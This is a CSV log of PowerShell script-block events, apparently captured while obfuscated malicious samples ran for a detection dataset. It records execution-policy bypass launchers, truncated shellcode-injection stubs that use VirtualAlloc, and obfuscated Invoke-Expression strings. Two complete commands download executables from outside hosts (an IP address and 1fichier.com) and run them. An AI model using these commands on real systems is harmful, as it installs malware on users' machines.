"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/5/2026 8:29:58 AM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\112.ps1'"
"8/5/2026 8:29:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:52 AM","","174","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\102.ps1'"
"8/5/2026 8:29:46 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:46 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\82.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:45 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\82.ps1'"
"8/5/2026 8:29:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:18 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\67.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:18 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\67.ps1'"
"8/5/2026 8:29:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:07 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\66.ps1","2236","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:07 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\66.ps1'"
"8/5/2026 8:29:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:29:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:29:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:29:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:29:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\61.ps1","2452","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:29:02 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\61.ps1'"
"8/5/2026 8:28:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\52.ps1","2717","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:28:52 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\52.ps1'"
"8/5/2026 8:28:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1","2251","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/5/2026 8:28:32 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\14.ps1'"
"8/5/2026 8:28:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1","2252","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:28:21 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\13.ps1'"
"8/5/2026 8:28:06 AM","","9","$global:?"
"8/5/2026 8:28:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:28:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:28:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:28:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:28:06 AM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/5/2026 8:28:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\124.ps1","444","Invoke-expReSSION(((""{11}{10}{7}{8}{9}{18}{3}{15}{35}{14}{31}{0}{36}{6}{17}{16}{20}{34}{28}{1}{21}{5}{19}{26}{25}{32}{13}{29}{23}{24}{33}{30}{27}{4}{22}{2}{12}"" -f 'oa','ich','b.exe','b','ss tZpf','om"
"8/5/2026 8:28:05 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\124.ps1'"
"8/5/2026 8:27:58 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/5/2026 8:27:58 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1","725"," (((""{50}{41}{40}{6}{24}{2}{16}{49}{20}{35}{52}{25}{36}{18}{17}{11}{8}{7}{37}{29}{42}{13}{45}{15}{47}{3}{48}{10}{31}{26}{9}{30}{39}{21}{46}{43}{4}{12}{33}{0}{34}{27}{19}{14}{32}{5}{28}{44}{1}{38}{51}{"
"8/5/2026 8:27:58 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\112.ps1'"
"8/5/2026 8:27:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:27:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:27:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:27:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:27:36 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:27:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1","2963"," ((""{9}{57}{26}{15}{16}{38}{35}{69}{28}{47}{45}{0}{61}{49}{18}{24}{68}{12}{53}{5}{58}{11}{21}{31}{33}{14}{10}{7}{48}{27}{62}{37}{56}{50}{19}{64}{1}{29}{63}{59}{13}{65}{22}{51}{44}{4}{25}{39}{3}{36}{52"
"8/5/2026 8:27:36 AM","","173","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\102.ps1'"
"8/5/2026 8:27:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:27:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:27:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:27:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:27:28 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:27:28 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\82.ps1","2763",".( $ShELLID[1]+$SheLLiD[13]+'X')( (((""{5}{0}{24}{20}{38}{40}{10}{6}{43}{13}{45}{1}{18}{4}{15}{44}{2}{42}{9}{14}{31}{46}{7}{26}{35}{41}{32}{30}{12}{3}{11}{8}{19}{36}{39}{23}{27}{34}{29}{21}{25}{37}{22}"
"8/5/2026 8:27:28 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\82.ps1'"
"8/5/2026 8:27:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:27:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:27:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:27:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:27:16 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:27:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\67.ps1","2780",".( $Env:cOMspec[4,26,25]-jOin'') ( (((""{35}{37}{42}{40}{6}{21}{41}{10}{28}{27}{26}{33}{1}{45}{25}{36}{38}{22}{18}{29}{2}{46}{16}{44}{3}{13}{23}{17}{30}{5}{39}{15}{34}{9}{14}{0}{12}{8}{24}{11}{7}{32}{3"
"8/5/2026 8:27:16 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\67.ps1'"
"8/5/2026 8:26:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:30 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:26:29 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\66.ps1","2965"," ((""{48}{21}{24}{33}{0}{34}{40}{32}{3}{6}{58}{66}{61}{27}{16}{14}{54}{29}{10}{64}{12}{50}{65}{60}{37}{17}{42}{43}{59}{35}{38}{5}{20}{23}{68}{18}{31}{15}{30}{47}{4}{67}{44}{56}{19}{46}{45}{55}{7}{53}{1"
"8/5/2026 8:26:29 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\66.ps1'"
"8/5/2026 8:26:22 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:22 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:22 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:22 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:22 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:26:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\61.ps1","3015","(((""{32}{13}{45}{16}{17}{38}{20}{4}{7}{6}{27}{39}{50}{19}{40}{10}{26}{0}{11}{15}{12}{48}{18}{14}{46}{43}{44}{8}{24}{49}{34}{25}{41}{5}{21}{31}{33}{23}{28}{2}{9}{1}{36}{22}{47}{3}{29}{37}{30}{35}{42}""-"
"8/5/2026 8:26:21 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\61.ps1'"
"8/5/2026 8:26:14 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:14 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:13 AM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:26:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\52.ps1","3550"," (((""{8}{57}{55}{41}{15}{72}{45}{3}{33}{17}{52}{81}{77}{47}{32}{38}{50}{44}{5}{9}{35}{70}{2}{26}{62}{60}{22}{14}{28}{29}{27}{65}{58}{4}{20}{30}{21}{82}{68}{64}{69}{13}{40}{36}{10}{11}{0}{80}{46}{24}{5"
"8/5/2026 8:26:13 AM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\52.ps1'"
"8/5/2026 8:26:07 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:26:07 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:26:07 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:26:07 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:26:07 AM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
